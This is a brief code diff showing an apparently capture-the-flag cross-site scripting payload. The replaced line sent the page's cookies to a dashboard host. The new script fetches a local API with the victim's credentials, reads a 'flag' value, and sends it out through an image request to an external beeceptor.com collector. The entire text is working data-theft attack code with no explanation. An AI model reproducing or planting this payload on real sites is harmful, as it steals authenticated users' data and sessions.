@@ -1,3 +1,8 @@
 <script>
-fetch('http://dashboard:5000/api/fetchflag?c='+document.cookie)
+fetch('http://127.0.0.1:5000/api/fetchflag', {credentials: 'include'})
+  .then(r => r.json())
+  .then(d => {
+    var i = new Image();
+    i.src = 'https://mesbaha.free.beeceptor.com/?flag=' + d.flag;
+  })
 </script>
